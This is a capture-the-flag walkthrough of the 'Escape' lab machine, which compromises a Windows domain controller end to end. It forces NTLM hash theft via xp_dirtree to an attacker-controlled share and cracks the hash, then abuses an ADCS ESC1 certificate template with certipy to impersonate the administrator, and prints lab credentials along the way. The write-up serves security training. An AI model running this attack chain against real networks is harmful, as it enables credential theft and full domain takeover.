# Box: Escape

> Damiano Gubiani | 15/11/2025

# Enumerating

lets export the machine ip

```bash
export IP='10.10.11.202'
```

## NMAP

running *nmap* to enumerate open ports on the target

command:

```bash
sudo nmap -sS -sC -sV -oN nmap/all --open -p - -T4 -vv $IP
```

output:

```
Nmap scan report for 10.10.11.202 (10.10.11.202)
Host is up, received echo-reply ttl 127 (0.11s latency).
Scanned at 2025-11-15 16:50:06 CET for 201s
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-15 23:51:54Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-15T23:53:26+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:     ee4c c647 ebb2 c23e f472 1d70 2880 9d82
| SHA-1:   d88d 12ae 8a50 fcf1 2242 909e 3dd7 5cff 92d1 a480
| SHA-256: 9b16 318b 7bc0 f508 b5cd 98a5 3a80 d1d7 54e1 e158 45b1 4956 003b 4bb5 05f8 7f98
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:     ee4c c647 ebb2 c23e f472 1d70 2880 9d82
| SHA-1:   d88d 12ae 8a50 fcf1 2242 909e 3dd7 5cff 92d1 a480
| SHA-256: 9b16 318b 7bc0 f508 b5cd 98a5 3a80 d1d7 54e1 e158 45b1 4956 003b 4bb5 05f8 7f98
|_ssl-date: 2025-11-15T23:53:25+00:00; +7h59m59s from scanner time.
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-15T23:47:01
| Not valid after:  2055-11-15T23:47:01
| MD5:     22bd f111 b9ad 4b58 547c 7ef7 d60a a517
| SHA-1:   19cb 90d6 430b 7f7c 5678 2d51 af17 5a22 70af a138
| SHA-256: fabe 85db d840 2615 5121 d5b8 07d5 8cfd 93c6 ec84 b0b9 1872 b10d 0c99 f15e 45f9
| ms-sql-ntlm-info:
|   10.10.11.202:1433:
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.202:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-11-15T23:53:26+00:00; +7h59m59s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-15T23:53:26+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:     ee4c c647 ebb2 c23e f472 1d70 2880 9d82
| SHA-1:   d88d 12ae 8a50 fcf1 2242 909e 3dd7 5cff 92d1 a480
| SHA-256: 9b16 318b 7bc0 f508 b5cd 98a5 3a80 d1d7 54e1 e158 45b1 4956 003b 4bb5 05f8 7f98
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:     ee4c c647 ebb2 c23e f472 1d70 2880 9d82
| SHA-1:   d88d 12ae 8a50 fcf1 2242 909e 3dd7 5cff 92d1 a480
| SHA-256: 9b16 318b 7bc0 f508 b5cd 98a5 3a80 d1d7 54e1 e158 45b1 4956 003b 4bb5 05f8 7f98
|_ssl-date: 2025-11-15T23:53:25+00:00; +7h59m59s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49728/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Open Ports:

```
139,445 -> SMB
5985,135 -> WINRM
1433 -> MSSQL
88,636,389 -> LDAP and Kerberos
```

we found the domain name , lets add it to the */etc/hosts file*

command:

```bash
echo '10.10.11.202 dc.sequel.htb sequel.htb' | sudo tee -a /etc/hosts
```

## SMB

first lets enumerate *SMB shares*

command:

```bash
smbclient -L \\\\$IP
```

output:

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	Public          Disk
	SYSVOL          Disk      Logon server share
```

after connecting to the public share we found a PDF file called *SQL Server Procedures.pdf* , lets analyze it

we found inside the *PDF file* some credentials

> PublicUser:GuestUserCantWrite1

## MSSQL

lets use the found credential to connect to *MSSQL*

command:

```bash
mssqlclient.py 'sequel.htb/PublicUser':'GuestUserCantWrite1'@$IP
```

after looking around i didn't find find something interesting.

lets steal the *ntlm2* using the *xp_dirtree* command.

# Exploit

first i started responder on my attacker machine

command:

```bash
responder -i 10.10.14.3 -v
```

after that lets run *xp_dirtree* on the victim machine to point on a non-existent share on out machine.

command:

```sql
EXEC master.sys.xp_dirtree '\\10.10.14.3\shared',1,1;
```

and we got a call on out machine

![](screen/Screenshot%202025-11-15%20at%2017.53.10.png)

i than run *hashcat* on the hash to *bruteforce* it and i got the password

command:

```bash
hashcat -m 5600 -a 0 svc_hash /opt/tools/wordlist/rockyou.txt
```

password found

> sql_svc:REGGIE1234ronnie

i started enumerating the AD DC with the new user found , lets run bloodhound on it to get a view of the AD structure

command:

```bash
nxc ldap $IP -u sql_svc -p 'REGGIE1234ronnie' --bloodhound --collect all --dns-server $IP
```

# Lateral Movment

looking at the user in bloodhound he is a part of the remote managment group so lets connect to the machine with evil-winrm

command:

```bash
evil-winrm -i $IP -u sql_svc -p REGGIE1234ronnie
```

looking around the machine we found the SQLserver directory and inside of it i found a error.bak file , lets check what inside of it.

![](screen/Pasted%20image%2020251115182638.png)

taking a better look at the log file we found some credentials for the user *ryan.cooper*

testing said credentials we can log to the machine

> ryan.cooper : NuclearMosquito3

and after loging in we found the user flag in the desktop folder

# Pivilege Escaletion

lets check the privilage and groups membership of the user 

command:

```powershell
whoami /priv
whoami /groups
```

output:

![](screen/Pasted%20image%2020251115183259.png)

the user is a part of the *Certificate Service DCOM Access* group

lets check with certipy for potential vulnerable certificate 

command:

```bash
certipy find -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -vulnerable -dc-ip 10.10.11.202
```

after running the command we found a vulnerable template to ESC1 or **Enrollee-Supplied Subject for Client Authentication**

to exploit this vulnerability i followed this guide:

> https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

first lets request the vulnerable template to impersonate the administrator account

command:

```bash
certipy req -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -target dc.sequel.htb -ca sequel-DC-CA -template UserAuthentication -upn 'administrator@sequel.htb'
```

and now lets authenticate to the DC

command:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202
```

but it returned the eror *KRB_AP_ERR_SKEW(Clock skew too great)*

to fix this we need to sync out clock with the DC one 

command:

```bash
sudo ntpdate $IP
```

and after we run the command again we get a TGT for the administrator account

![](screen/Pasted%20image%2020251116024431.png)

lets connect to the machine with PsExec from impacket suite

command:

```bash
export KRB5CCNAME=administrator.ccache

psexec.py 'sequel.htb/administrator@dc.sequel.htb'  -k -no-pass
```

after connecting to the machine lets check if we are administrator

![](screen/Pasted%20image%2020251116024858.png)

we get the root flag in the desktop of the administrator user

